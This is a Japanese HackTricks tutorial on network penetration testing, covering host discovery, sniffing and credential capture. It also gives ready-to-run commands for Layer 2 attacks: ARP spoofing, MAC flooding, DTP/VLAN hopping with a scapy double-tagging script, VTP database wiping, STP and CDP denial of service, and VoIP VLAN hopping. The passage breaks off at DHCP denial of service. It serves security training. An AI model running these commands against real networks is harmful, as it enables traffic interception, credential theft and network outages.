# ネットワークのペンテスト

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* **サイバーセキュリティ企業**で働いていますか？ **HackTricksで会社を宣伝**したいですか？または、**PEASSの最新バージョンにアクセスしたり、HackTricksをPDFでダウンロード**したいですか？[**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)をチェックしてください！
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)を見つけてください。独占的な[**NFT**](https://opensea.io/collection/the-peass-family)のコレクションです。
* [**公式のPEASS＆HackTricksのグッズ**](https://peass.creator-spring.com)を手に入れましょう。
* [**💬**](https://emojipedia.org/speech-balloon/) [**Discordグループ**](https://discord.gg/hRep4RUj7f)または[**telegramグループ**](https://t.me/peass)に**参加**するか、**Twitter**で**フォロー**してください[**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**。**
* **ハッキングのトリックを共有するには、PRを** [**hacktricks repo**](https://github.com/carlospolop/hacktricks) **と** [**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud) **に提出してください。**

</details>

<img src="../../.gitbook/assets/i3.png" alt="" data-size="original">\
**バグバウンティのヒント**: **ハッカーによって作成されたプレミアムなバグバウンティプラットフォーム**である**Intigriti**に**サインアップ**してください！今すぐ[**https://go.intigriti.com/hacktricks**](https://go.intigriti.com/hacktricks)に参加して、最大**$100,000**のバウンティを獲得しましょう！

{% embed url="https://go.intigriti.com/hacktricks" %}

## 外部からホストを発見する

これは、**インターネット**から**応答しているIPアドレス**を見つける方法についての**簡単なセクション**です。\
この状況では、いくつかの**IPの範囲**（おそらく複数の**範囲**）があり、**どのIPが応答しているか**を見つけるだけです。

### ICMP

これは、ホストが起動しているかどうかを確認する**最も簡単で最も高速な方法**です。\
いくつかの**ICMP**パケットを送信して**応答を期待**することができます。最も簡単な方法は、**エコーリクエスト**を送信して応答を期待することです。単純な`ping`コマンドを使用するか、**範囲**を使用するために`fping`コマンドを使用することができます。\
また、**nmap**を使用して他のタイプのICMPパケットを送信することもできます（これにより、一般的なICMPエコーリクエスト-応答のフィルタリングが回避されます）。
```bash
ping -c 1 199.66.11.4    # 1 echo request to a host
fping -g 199.66.11.0/24  # Send echo requests to ranges
nmap -PEPM -sP -n 199.66.11.0/24 #Send echo, timestamp requests and subnet mask requests
```
### TCPポートの探索

あらゆる種類のICMPパケットがフィルタリングされていることは非常に一般的です。そのため、ホストが稼働しているかどうかを確認するためにできることは、**オープンポートを見つける**ことです。各ホストには**65535のポート**がありますので、もし「大きな」スコープを持っている場合、各ホストの**すべてのポート**がオープンしているかどうかをテストすることはできません。それには時間がかかりすぎます。\
そのため、必要なのは**高速なポートスキャナー**（[masscan](https://github.com/robertdavidgraham/masscan)）と、**よりよく使用されるポートのリスト**です。
```bash
#Using masscan to scan top20ports of nmap in a /24 range (less than 5min)
masscan -p20,21-23,25,53,80,110,111,135,139,143,443,445,993,995,1723,3306,3389,5900,8080 199.66.11.0/24
```
この手順は `nmap` を使用しても実行できますが、それは遅く、ホストを正確に識別する際に問題があります。

### HTTPポートの検出

これは、HTTPサービスの検出に焦点を当てたTCPポートの検出です。
```bash
masscan -p80,443,8000-8100,8443 199.66.11.0/24
```
### UDPポートの探索

ホストに**特に注意を払うべきかどうか**を判断するために、**UDPポートが開いているかどうか**をチェックすることもできます。通常、UDPサービスは通常の空のUDPプローブパケットに対して**データを返さない**ため、ポートがフィルタリングされているのか開いているのかを判断するのは難しいです。これを判断する最も簡単な方法は、実行中のサービスに関連するパケットを送信することですが、実行中のサービスがわからないため、ポート番号に基づいて最も可能性の高いものを試す必要があります。
```bash
nmap -sU -sV --version-intensity 0 -F -n 199.66.11.53/24
# The -sV will make nmap test each possible known UDP service packet
# The "--version-intensity 0" will make nmap only test the most probable
```
前に提案されたnmapの行は、/24の範囲内のすべてのホストで**上位1000のUDPポート**をテストしますが、これだけでも**20分以上**かかります。もっと**高速な結果**が必要な場合は、[**udp-proto-scanner**](https://github.com/portcullislabs/udp-proto-scanner)を使用できます: `./udp-proto-scanner.pl 199.66.11.53/24` これにより、これらの**UDPプローブ**が予想されるポートに送信されます（/24の範囲では1分で完了します）: _DNSStatusRequest、DNSVersionBindReq、NBTStat、NTPRequest、RPCCheck、SNMPv3GetRequest、chargen、citrix、daytime、db2、echo、gtpv1、ike、ms-sql、ms-sql-slam、netop、ntp、rpc、snmp-public、systat、tftp、time、xdmcp。_

### SCTPポートの検出
```bash
#Probably useless, but it's pretty fast, why not trying?
nmap -T4 -sY -n --open -Pn <IP/range>
```
## Wifiのペンテスト

ここでは、執筆時点でよく知られているWifi攻撃の素晴らしいガイドを見つけることができます：

{% content-ref url="../pentesting-wifi/" %}
[pentesting-wifi](../pentesting-wifi/)
{% endcontent-ref %}

## 内部からホストを発見する

ネットワーク内部にいる場合、最初に行いたいことの一つは、**他のホストを発見する**ことです。**どれだけのノイズ**を出すことができるか/したいかによって、異なるアクションを実行することができます：

### パッシブ

これらのツールを使用して、接続されたネットワーク内のホストを受動的に発見することができます：
```bash
netdiscover -p
p0f -i eth0 -p -o /tmp/p0f.log
# Bettercap
net.recon on/off #Read local ARP cache periodically
net.show
set net.show.meta true #more info
```
### アクティブ

[_**外部からホストを発見する**_](./#discovering-hosts-from-the-outside)（TCP/HTTP/UDP/SCTPポートの発見）でコメントされているテクニックは、ここでも**適用できます**。\
ただし、他のホストと**同じネットワーク**にいるため、**さらに多くのこと**ができます。
```bash
#ARP discovery
nmap -sn <Network> #ARP Requests (Discover IPs)
netdiscover -r <Network> #ARP requests (Discover IPs)

#NBT discovery
nbtscan -r 192.168.0.1/24 #Search in Domain

# Bettercap
net.probe on/off #Discover hosts on current subnet by probing with ARP, mDNS, NBNS, UPNP, and/or WSD
set net.probe.mdns true/false #Enable mDNS discovery probes (default=true)
set net.probe.nbns true/false #Enable NetBIOS name service discovery probes (default=true)
set net.probe.upnp true/false #Enable UPNP discovery probes (default=true)
set net.probe.wsd true/false #Enable WSD discovery probes (default=true)
set net.probe.throttle 10 #10ms between probes sent (default=10)

#IPv6
alive6 <IFACE> # Send a pingv6 to multicast.
```
### Active ICMP

注意してほしいのは、_Discovering hosts from the outside_ ([_**ICMP**_](./#icmp)) でコメントされているテクニックは、ここでも**適用できる**ということです。\
ただし、他のホストとは**同じネットワーク**にいるため、**さらに多くのこと**ができます。

* **サブネットのブロードキャストアドレス**に対して**ping**を送信すると、pingが**各ホスト**に到達し、彼らが**あなたに応答**する可能性があります: `ping -b 10.10.5.255`
* **ネットワークのブロードキャストアドレス**にpingを送信すると、**他のサブネット内のホスト**を見つけることもできます: `ping -b 255.255.255.255`
* `nmap`の`-PEPM`フラグを使用して、**ICMPv4 echo**、**timestamp**、および**subnet mask requests**を送信してホストの検出を実行することもできます: `nmap -PEPM -sP –vvv -n 10.12.5.0/24`

### **Wake On Lan**

Wake On Lanは、**ネットワークメッセージ**を介してコンピュータを**起動**するために使用されます。コンピュータを起動するために使用されるマジックパケットは、単に**MAC Dst**が提供され、それが同じパケット内で**16回繰り返される**パケットです。\
そのため、この種のパケットは通常、**イーサネット0x0842**または**ポート9へのUDPパケット**で送信されます。\
**\[MAC]**が提供されていない場合、パケットは**ブロードキャストイーサネット**に送信されます（ブロードキャストMACが繰り返されるものになります）。
```bash
# Bettercap (if no [MAC] is specificed ff:ff:ff:ff:ff:ff will be used/entire broadcast domain)
wol.eth [MAC] #Send a WOL as a raw ethernet packet of type 0x0847
wol.udp [MAC] #Send a WOL as an IPv4 broadcast packet to UDP port 9
```
## ホストのスキャン

詳細にスキャンしたいすべてのIP（外部または内部）を発見したら、さまざまなアクションを実行できます。

### TCP

* **オープン**ポート： _SYN --> SYN/ACK --> RST_
* **クローズド**ポート： _SYN --> RST/ACK_
* **フィルタリングされた**ポート： _SYN --> \[NO RESPONSE]_
* **フィルタリングされた**ポート： _SYN --> ICMPメッセージ_
```bash
# Nmap fast scan for the most 1000tcp ports used
nmap -sV -sC -O -T4 -n -Pn -oA fastscan <IP>
# Nmap fast scan for all the ports
nmap -sV -sC -O -T4 -n -Pn -p- -oA fullfastscan <IP>
# Nmap fast scan for all the ports slower to avoid failures due to -T4
nmap -sV -sC -O -p- -n -Pn -oA fullscan <IP>

#Bettercap Scan
syn.scan 192.168.1.0/24 1 10000 #Ports 1-10000
```
### UDP

UDPポートをスキャンするための2つのオプションがあります：

* ポートが**閉じている**場合、**UDPパケット**を送信し、応答が**ICMP unreachable**であるかどうかを確認します（いくつかの場合、ICMPは**フィルタリング**されるため、ポートが閉じているか開いているかの情報を受信できません）。
* 応答を引き出すために、**フォーマットされたデータグラム**を**サービス**（例：DNS、DHCP、TFTPなど、_nmap-payloads_にリストされている他のサービス）に送信します。応答を受け取った場合、ポートは**開いています**。

**Nmap**は、"-sV"を使用して両方のオプションを**組み合わせ**ます（UDPスキャンは非常に遅いです）。ただし、UDPスキャンはTCPスキャンよりも遅いことに注意してください：
```bash
# Check if any of the most common udp services is running
udp-proto-scanner.pl <IP>
# Nmap fast check if any of the 100 most common UDP services is running
nmap -sU -sV --version-intensity 0 -n -F -T4 <IP>
# Nmap check if any of the 100 most common UDP services is running and launch defaults scripts
nmap -sU -sV -sC -n -F -T4 <IP>
# Nmap "fast" top 1000 UDP ports
nmap -sU -sV --version-intensity 0 -n -T4 <IP>
# You could use nmap to test all the UDP ports, but that will take a lot of time
```
### SCTPスキャン

SCTPはTCPとUDPと並んで存在します。IP上での**電話**データの**輸送**を提供することを目的としており、このプロトコルはSignaling System 7（SS7）の信頼性機能の多くを複製し、SIGTRANとして知られる大規模なプロトコルファミリーの基盤となっています。SCTPは、IBM AIX、Oracle Solaris、HP-UX、Linux、Cisco IOS、およびVxWorksを含むオペレーティングシステムでサポートされています。

nmapでは、SCTPに対して2つの異なるスキャンが提供されています: _-sY_ と _-sZ_
```bash
# Nmap fast SCTP scan
nmap -T4 -sY -n -oA SCTFastScan <IP>
# Nmap all SCTP scan
nmap -T4 -p- -sY -sV -sC -F -n -oA SCTAllScan <IP>
```
### IDSとIPSの回避

{% content-ref url="ids-evasion.md" %}
[ids-evasion.md](ids-evasion.md)
{% endcontent-ref %}

### **さらなるnmapオプション**

{% content-ref url="nmap-summary-esp.md" %}
[nmap-summary-esp.md](nmap-summary-esp.md)
{% endcontent-ref %}

### 内部IPアドレスの特定

設定ミスのあるルーター、ファイアウォール、およびネットワークデバイスは、ネットワークプローブに対して**非公開のソースアドレスを使用して応答する**ことがあります。テスト中に、_tcpdump_を使用して**プライベートアドレスから受信したパケットを特定**することができます。この場合、Kali Linuxの_eth2_インターフェースは**公共のインターネットからアクセス可能**です（もし**NAT**または**ファイアウォール**の**背後**にいる場合、この種のパケットはおそらく**フィルタリング**されるでしょう）。
```bash
tcpdump –nt -i eth2 src net 10 or 172.16/12 or 192.168/16
tcpdump: verbose output suppressed, use -v or -vv for full protocol decode
listening on eth2, link-type EN10MB (Ethernet), capture size 65535 bytes
IP 10.10.0.1 > 185.22.224.18: ICMP echo reply, id 25804, seq 1582, length 64
IP 10.10.0.2 > 185.22.224.18: ICMP echo reply, id 25804, seq 1586, length 64
```
## スニッフィング

スニッフィングを行うことで、キャプチャされたフレームやパケットを確認することで、IP範囲、サブネットのサイズ、MACアドレス、ホスト名の詳細を知ることができます。ネットワークが誤って構成されているか、スイッチングファブリックがストレス下にある場合、攻撃者は受動的なネットワークスニッフィングを通じて機密情報をキャプチャすることができます。

スイッチングイーサネットネットワークが適切に構成されている場合、ブロードキャストフレームとMACアドレス宛のデータのみが表示されます。

### TCPDump
```bash
sudo tcpdump -i <INTERFACE> udp port 53 #Listen to DNS request to discover what is searching the host
tcpdump -i <IFACE> icmp #Listen to icmp packets
sudo bash -c "sudo nohup tcpdump -i eth0 -G 300 -w \"/tmp/dump-%m-%d-%H-%M-%S-%s.pcap\" -W 50 'tcp and (port 80 or port 443)' &"
```
リアルタイムでGUIとしてWiresharkを使用して、SSHセッションを介してリモートマシンからパケットをキャプチャすることもできます。
```
ssh user@<TARGET IP> tcpdump -i ens160 -U -s0 -w - | sudo wireshark -k -i -
ssh <USERNAME>@<TARGET IP> tcpdump -i <INTERFACE> -U -s0 -w - 'port not 22' | sudo wireshark -k -i - # Exclude SSH traffic
```
### Bettercap

Bettercapは、ネットワークのペネトレーションテストに使用される強力なツールです。このツールは、中間者攻撃やスニッフィングなどのさまざまな攻撃手法を実行することができます。Bettercapは、ARPスープやDNSスプーフィングなどの攻撃を実行するためのモジュールを提供しています。

Bettercapを使用すると、ネットワーク上のトラフィックをキャプチャし、解析することができます。また、ユーザーのセッションを傍受し、情報を盗むことも可能です。Bettercapは、ネットワークの脆弱性を特定し、セキュリティの脆弱性をテストするための便利なツールです。

Bettercapは、コマンドラインインターフェース（CLI）を使用して操作されます。さまざまなモジュールやオプションを使用して、攻撃手法をカスタマイズすることができます。Bettercapは、ネットワークのセキュリティをテストするための優れたツールであり、ペネトレーションテスターにとって非常に有用です。
```bash
net.sniff on
net.sniff stats
set net.sniff.output sniffed.pcap #Write captured packets to file
set net.sniff.local  #If true it will consider packets from/to this computer, otherwise it will skip them (default=false)
set net.sniff.filter #BPF filter for the sniffer (default=not arp)
set net.sniff.regexp #If set only packets matching this regex will be considered
```
### Wireshark

当然です。

### 資格情報のキャプチャ

[https://github.com/lgandx/PCredz](https://github.com/lgandx/PCredz)のようなツールを使用して、pcapファイルまたはライブインターフェースから資格情報を解析することができます。

## LAN攻撃

### ARPスプーフィング

ARPスプーフィングは、偽のARP応答を送信して、マシンのIPが私たちのデバイスのMACアドレスであることを示すことです。その後、被害者はARPテーブルを変更し、IPスプーフィングされた場合には常に私たちのマシンに連絡を取るようになります。

#### **Bettercap**
```bash
arp.spoof on
set arp.spoof.targets <IP> #Specific targets to ARP spoof (default=<entire subnet>)
set arp.spoof.whitelist #Specific targets to skip while spoofing
set arp.spoof.fullduplex true #If true, both the targets and the gateway will be attacked, otherwise only the target (default=false)
set arp.spoof.internal true #If true, local connections among computers of the network will be spoofed, otherwise only connections going to and coming from the Internet (default=false)
```
#### **Arpspoof（ARPスプーフィング）**

Arpspoofは、ARPスプーフィング攻撃を実行するためのツールです。ARPスプーフィングは、ネットワーク上のデバイス間の通信を傍受、盗聴、改ざんするために使用されます。この攻撃では、攻撃者はネットワーク上の他のデバイスに対して自身が目的のデバイスであるかのように偽装します。これにより、攻撃者は通信の内容を傍受し、必要に応じて改ざんすることができます。

Arpspoofは、攻撃者がターゲットデバイスとゲートウェイ（ルーター）の間の通信を傍受するために使用されます。攻撃者は、ターゲットデバイスに対して自身がゲートウェイであるかのように偽装し、同時にゲートウェイに対して自身がターゲットデバイスであるかのように偽装します。これにより、攻撃者はターゲットデバイスとゲートウェイの間の通信を傍受し、必要に応じて改ざんすることができます。

Arpspoofは、ネットワーク内のデバイス間の通信を監視するための便利なツールですが、悪意のある目的で使用される可能性もあるため、慎重に使用する必要があります。
```bash
echo 1 > /proc/sys/net/ipv4/ip_forward
arpspoof -t 192.168.1.1 192.168.1.2
arpspoof -t 192.168.1.2 192.168.1.1
```
### MACフラッディング - CAMオーバーフロー

スイッチのCAMテーブルをオーバーフローさせ、異なるソースMACアドレスを持つ多くのパケットを送信します。CAMテーブルがいっぱいになると、スイッチはハブのように振る舞い始めます（すべてのトラフィックをブロードキャストします）。
```bash
macof -i <interface>
```
現代のスイッチでは、この脆弱性は修正されています。

### 802.1Q VLAN / DTP 攻撃

#### ダイナミックトランキング

**DTP (Dynamic Trunking Protocol)** は、自動トランキングシステムを提供するために設計されたリンク層プロトコルです。DTPを使用すると、スイッチはどのポートがトランクモード（Trunk）で動作し、どのポートがそうでないかを決定します。**DTPの使用は、ネットワーク設計が不十分であることを示しています。**トランクは必要な場所に厳密に配置され、文書化されるべきです。

**デフォルトでは、すべてのスイッチポートは Dynamic Auto モードで動作します。**これは、スイッチポートが隣接するスイッチからのトランク初期化モードであることを示しています。**ペンテスターはスイッチに物理的に接続し、DTP Desirable フレームを送信する必要があります**。これにより、ポートがトランクモードに切り替わります。攻撃者は、STPフレームの解析を使用してVLANを列挙し、仮想インターフェースを作成することでVLANセグメンテーションを回避することができます。

多くのスイッチはデフォルトで Dynamic Trunking Protocol (DTP) をサポートしていますが、これを悪用して**スイッチをエミュレートし、すべてのVLANを介してトラフィックを受信**することができます。ツール [_**dtpscan.sh**_](https://github.com/commonexploits/dtpscan) は、インターフェースをスニフィングし、スイッチがデフォルトモード、トランク、ダイナミック、オート、またはアクセスモードであるかを**報告します**（これはVLANホッピングを回避する唯一の方法です）。ツールは、スイッチが脆弱かどうかを示します。

ネットワークが脆弱であることが判明した場合、_**Yersinia**_ を使用してプロトコル "**DTP**" を使用した "**enable trunking**" を実行し、すべてのVLANからのネットワークパケットを表示することができます。
```bash
apt-get install yersinia #Installation
sudo apt install kali-linux-large #Another way to install it in Kali
yersinia -I #Interactive mode
#In interactive mode you will need to select a interface first
#Then, you can select the protocol to attack using letter "g"
#Finally, you can select the attack using letter "x"

yersinia -G #For graphic mode
```
![](<../../.gitbook/assets/image (646) (1).png>)

VLANを列挙するためには、スクリプト[DTPHijacking.py](https://github.com/in9uz/VLANPWN/blob/main/DTPHijacking.py)を使用してDTP Desirableフレームを生成することも可能です。スクリプトを絶対に中断しないでください。それは3秒ごとにDTP Desirableを注入します。スイッチ上で動的に作成されたトランクチャネルは、わずか5分間しか存在しません。5分後にトランクは切断されます。
```
sudo python3 DTPHijacking.py --interface eth0
```
私たちがSTPフレームを分析することで、VLAN 30とVLAN 60の存在を知ることができます。

<figure><img src="../../.gitbook/assets/image (18) (1).png" alt=""><figcaption></figcaption></figure>

#### 特定のVLANへの攻撃

VLANのIDとIP値がわかったら、特定のVLANに攻撃するために仮想インターフェースを設定することができます。\
DHCPが利用できない場合は、静的IPアドレスを設定するために_ifconfig_を使用してください。
```
root@kali:~# modprobe 8021q
root@kali:~# vconfig add eth1 250
Added VLAN with VID == 250 to IF -:eth1:-
root@kali:~# dhclient eth1.250
Reloading /etc/samba/smb.conf: smbd only.
root@kali:~# ifconfig eth1.250
eth1.250  Link encap:Ethernet  HWaddr 00:0e:c6:f0:29:65
inet addr:10.121.5.86  Bcast:10.121.5.255  Mask:255.255.255.0
inet6 addr: fe80::20e:c6ff:fef0:2965/64 Scope:Link
UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1
RX packets:19 errors:0 dropped:0 overruns:0 frame:0
TX packets:13 errors:0 dropped:0 overruns:0 carrier:0
collisions:0 txqueuelen:0
RX bytes:2206 (2.1 KiB)  TX bytes:1654 (1.6 KiB)

root@kali:~# arp-scan -I eth1.250 10.121.5.0/24
```

```bash
# Another configuration example
modprobe 8021q
vconfig add eth1 20
ifconfig eth1.20 192.168.1.2 netmask 255.255.255.0 up
```

```bash
# Another configuration example
sudo vconfig add eth0 30
sudo ip link set eth0.30 up
sudo dhclient -v eth0.30
```
#### 自動VLANホッパー

**ダイナミックトランキングと仮想インターフェースの作成、他のVLAN内のホストの発見**という攻撃は、ツール[**https://github.com/nccgroup/vlan-hopping---frogger**](https://github.com/nccgroup/vlan-hopping---frogger)によって**自動的に実行**されます。

#### ダブルタギング

攻撃者が**被害者ホストのMAC、IP、VLAN IDの値を知っている**場合、指定されたVLANと被害者のVLANのフレームに**ダブルタグを付けて**パケットを送信することができます。被害者は攻撃者との接続ができないため、攻撃者にとって**最良のオプションはUDPを介して通信する**ことです（SNMPのような興味深いアクションを実行できるプロトコル）。

攻撃者の別のオプションは、攻撃者が制御し、被害者がアクセスできるIPをスプーフィングして**TCPポートスキャンを実行**することです（おそらくインターネット経由で）。その後、攻撃者は自分が所有する2番目のホストでパケットを受信するかどうかをスニッフィングすることができます。

![](<../../.gitbook/assets/image (635) (1).png>)

この攻撃を実行するには、scapyを使用できます：`pip install scapy`
```python
from scapy.all import *
# Double tagging with ICMP packet (the response from the victim isn't double tagged so it will never reach the attacker)
packet = Ether()/Dot1Q(vlan=1)/Dot1Q(vlan=20)/IP(dst='192.168.1.10')/ICMP()
sendp(packet)
```
#### Lateral VLANセグメンテーションバイパス <a href="#d679" id="d679"></a>

もし**直接接続されたスイッチにアクセス権限がある**場合、ネットワーク内での**VLANセグメンテーションをバイパス**することができます。単にポートをトランクモード（またはトランク）に切り替え、ターゲットVLANのIDを持つ仮想インターフェースを作成し、IPアドレスを設定します。アドレスを動的に要求する（DHCP）か、静的に設定するかはケースによります。

{% content-ref url="lateral-vlan-segmentation-bypass.md" %}
[lateral-vlan-segmentation-bypass.md](lateral-vlan-segmentation-bypass.md)
{% endcontent-ref %}

#### レイヤー3プライベートVLANバイパス

ゲストワイヤレスネットワークやその他の環境では、プライベートVLAN（またはポートアイソレーションとも呼ばれる）設定が使用されています。これにより、ピア同士の相互作用が**防止されます**（つまり、クライアントは**ワイヤレスアクセスポイントに接続できますが、互いにアドレスを指定することはできません**）。ネットワークACL（またはそれがない場合）によっては、IPパケットをルータに送信し、それが隣接するピアに転送される可能性があります。

この攻撃では、**クライアントのIPに対してルータのMACを持つ特別に作成されたパケットを送信**します。その後、**ルータはパケットをクライアントにリダイレクト**します。_ダブルタギング攻撃_と同様に、被害者によってアクセス可能なホストを制御することで、この脆弱性を悪用することができます。

### VTP攻撃

**VTP（VLANトランキングプロトコル）**は、VLANを一元管理するためのプロトコルです。スイッチは現在のVLANデータベースを追跡するために特別なリビジョン番号をチェックします。テーブルの更新が発生すると、リビジョン番号は1つ増加します。そして、スイッチがより高いリビジョン番号の設定を検出した場合、自動的にVLANデータベースを更新します。

#### VTPドメインの役割 <a href="#ebfc" id="ebfc"></a>

* **VTPサーバー.** VTPサーバーの役割を持つスイッチは、新しいVLANを作成したり、古いVLANを削除したり、VLAN自体の情報を変更したりすることができます。**また、ドメインの他のメンバーに対してVTPアナウンスを生成します。**
* **VTPクライアント.** この役割のスイッチは、ドメイン内の他のスイッチから特定のVTPアナウンスを受信し、自身のVLANデータベースを更新します。クライアントはVLANを作成する能力に制限があり、VLANの設定をローカルで変更することはできません。言い換えれば、**読み取り専用アクセス**です。
* **VTPトランスペアレント.** このモードでは、スイッチはVTPプロセスに参加せず、VLAN構成全体の完全なローカル管理を行うことができます。トランスペアレントモードで動作している場合、スイッチは他のスイッチからのVTPアナウンスのみを送信し、VLAN構成には影響を与えません。**このようなスイッチのリビジョン番号は常にゼロであり、攻撃の対象にはなりません。**

#### 広告タイプ <a href="#b384" id="b384"></a>

* **サマリ広告 —** VTPサーバーが**300秒（5分）ごとに送信する**VTPアナウンスです。このアナウンスにはVTPドメイン名、プロトコルバージョン、タイムスタンプ、およびMD5構成ハッシュ値が格納されています。
* **サブセット広告 —** VLAN構成の変更が発生するたびに送信されるVTP広告です。
* **広告リクエスト —** VTPクライアントからVTPサーバーへのサマリ広告メッセージのリクエストです。通常、スイッチがより高い構成リビジョン番号を持つサマリ広告を検出したメッセージに対して送信されます。

VTPは**トランクポートからのみ攻撃**することができます。なぜなら、VTPアナウンスはトランクポートでのみブロードキャストおよび受信されるからです。**したがって、DTPへの攻撃後のペントestingでは、次のターゲットはVTPになる可能性があります。** VTPドメインを攻撃するには、**Yersinia**を使用して**VTPインジェクトを実行**し、**VLANデータベース全体を消去**してネットワークを麻痺させることができます。

{% hint style="info" %}
VTPプロトコルには**3つのバージョン**があります。この記事では、最初のバージョンであるVTPv1に対する攻撃です。
{% endhint %}
```bash
yersinia -G #For graphic mode
```
### STP攻撃

**インターフェースでBPDUフレームをキャプチャできない場合、STP攻撃は成功しない可能性が高いです。**

#### **STP BPDU DoS**

多くのBPDUs（Topology Change Notification）またはConf（トポロジが作成されるときに送信されるBPDUs）を送信すると、スイッチが過負荷になり、正しく動作しなくなります。
```bash
yersinia stp -attack 2
yersinia stp -attack 3
#Use -M to disable MAC spoofing
```
#### **STP TCP 攻撃**

TCP を送信すると、スイッチの CAM テーブルは 15 秒で削除されます。その後、この種のパケットを連続して送信すると、CAM テーブルは連続して再起動されます（または毎 15 秒ごとに再起動されます）。再起動されると、スイッチはハブのように振る舞います。
```bash
yersinia stp -attack 1 #Will send 1 TCP packet and the switch should restore the CAM in 15 seconds
yersinia stp -attack 0 #Will send 1 CONF packet, nothing else will happen
```
#### **STPルート攻撃**

攻撃者は、スイッチの振る舞いをシミュレートしてネットワークのSTPルートになります。その結果、より多くのデータが攻撃者を経由します。これは、異なるスイッチに接続されている場合に興味深いです。\
これは、BPDUs CONFパケットを送信して、**優先度**値が実際のルートスイッチの優先度よりも低いと言います。
```bash
yersinia stp -attack 4 #Behaves like the root switch
yersinia stp -attack 5 #This will make the device behaves as a switch but will not be root
```
**もし攻撃者が2つのスイッチに接続されている場合、彼は新しいツリーのルートとなり、それらのスイッチ間のすべてのトラフィックは彼を経由します**（MITM攻撃が実行されます）。
```bash
yersinia stp -attack 6 #This will cause a DoS as the layer 2 packets wont be forwarded. You can use Ettercap to forward those packets "Sniff" --> "Bridged sniffing"
ettercap -T -i eth1 -B eth2 -q #Set a bridge between 2 interfaces to forwardpackages
```
### CDP攻撃

CISCO Discovery Protocolは、CISCOデバイスが相互に通信し、**誰が生きているか**、どのような機能を持っているかを確認するために使用されるプロトコルです。

#### 情報収集 <a href="#0e0f" id="0e0f"></a>

**デフォルトでは、CDPはすべてのポートにアナウンスを送信します。**しかし、もし侵入者が同じスイッチのポートに接続した場合はどうでしょうか？ネットワークスニッファ（Wireshark、tcpdump、Yersiniaなど）を使用して、彼はデバイス自体に関する**貴重な情報**を抽出することができます。モデルからCisco IOSのバージョンまでの情報を使用して、彼は同じバージョンのCisco IOSを列挙し、脆弱性を見つけてそれを悪用することができます。

#### CDPフラッディング攻撃 <a href="#0d6a" id="0d6a"></a>

実際のCISCOデバイスをシミュレートしてデバイスのメモリを枯渇させることで、CISCOスイッチにDoS攻撃を行うことができます。
```bash
sudo yersinia cdp -attack 1 #DoS Attack simulating new CISCO devices
# Or you could use the GUI
sudo yersinia -G
```
**CDPテーブルのフラッディング**オプションを選択し、攻撃を開始します。スイッチのCPUおよびCDP隣接テーブルが過負荷となり、「ネットワークの麻痺」が発生します。

<figure><img src="../../.gitbook/assets/image (1) (5) (1).png" alt=""><figcaption></figcaption></figure>

#### CDPなりすまし攻撃
```bash
sudo yersinia cdp -attack 2 #Simulate a new CISCO device
sudo yersinia cdp -attack 0 #Send a CDP packet
```
また、[**scapy**](https://github.com/secdev/scapy/)を使用することもできます。`scapy/contrib`パッケージを使用してインストールしてください。

### VoIP攻撃

従業員のインターネット電話（VoIP）端末を使用することを意図しているにもかかわらず、現代のVoIPデバイスはますますIoTデバイスと統合されています。多くの従業員は特別な電話番号を使用してドアを開けたり、部屋の温度調節を制御したりすることができます...

ツール[**voiphopper**](http://voiphopper.sourceforge.net)は、Cisco、Avaya、Nortel、Alcatel-Lucentの環境でVoIP電話の振る舞いを模倣します。サポートされているデバイス検出プロトコルの1つであるCisco Discovery Protocol（CDP）、Dynamic Host Configuration Protocol（DHCP）、Link Layer Discovery Protocol Media Endpoint Discovery（LLDP-MED）、および802.1Q ARPを使用して、音声ネットワークの正しいVLAN IDを自動的に検出します。

**VoIP Hopper**は**3つ**のCDPモードをサポートしています。**sniff**モードはネットワークパケットを検査し、VLAN IDを特定しようとします。使用するには、**`-c`**パラメータを`0`に設定します。**spoof**モードは、企業ネットワークで実際のVoIPデバイスが送信するのと似たカスタムパケットを生成します。使用するには、**`-c`**パラメータを**`1`**に設定します。**pre-madepacket**モードのスプーフは、Cisco 7971G-GE IP電話と同じパケットを送信します。使用するには、**`-c`**パラメータを**`2`**に設定します。

最後の方法を使用する理由は、最も高速なアプローチだからです。**`-i`**パラメータは攻撃者の**ネットワークインターフェース**を指定し、**`-E`**パラメータは模倣される**VOIPデバイスの名前**を指定します。私たちはCiscoのVoIP電話の命名形式と互換性のあるSEP001EEEEEEEEEという名前を選びました。この形式は、「SEP」という単語に続いてMACアドレスが続くものです。企業環境では、電話の裏にあるMACラベルを見て既存のVoIPデバイスを模倣することができます。または、電話のディスプレイ画面で設定ボタンを押し、モデル情報オプションを選択するか、VoIPデバイスのイーサネットケーブルをノートパソコンに接続し、Wiresharkを使用してデバイスのCDPリクエストを観察することもできます。
```bash
voiphopper -i eth1 -E 'SEP001EEEEEEEEE ' -c 2
```
もしツールが正常に実行された場合、**VLANネットワークは攻撃者のデバイスにIPv4アドレスを割り当てます**。

### DHCP攻撃

#### 列挙
```bash
nmap --script broadcast-dhcp-discover
Starting Nmap 7.80 ( https://nmap.org ) at 2019-10-16 05:30 EDT
WARNING: No targets were specified, so 0 hosts scanned.
Pre-scan script results:
| broadcast-dhcp-discover:
|   Response 1 of 1:
|     IP Offered: 192.168.1.250
|     DHCP Message Type: DHCPOFFER
|     Server Identifier: 192.168.1.1
|     IP Address Lease Time: 1m00s
|     Subnet Mask: 255.255.255.0
|     Router: 192.168.1.1
|     Domain Name Server: 192.168.1.1
|_    Domain Name: mynet
Nmap done: 0 IP addresses (0 hosts up) scanned in 5.27 seconds
```
**DoS**

**DoS（Denial of Service）**

DHCPサーバーに対しては、2つのタイプのDoSが実行される可能性があります。最初のタイプは、**十分な数の偽のホストをシミュレートして、すべての可能なIPアドレスを使用する**ことです。\
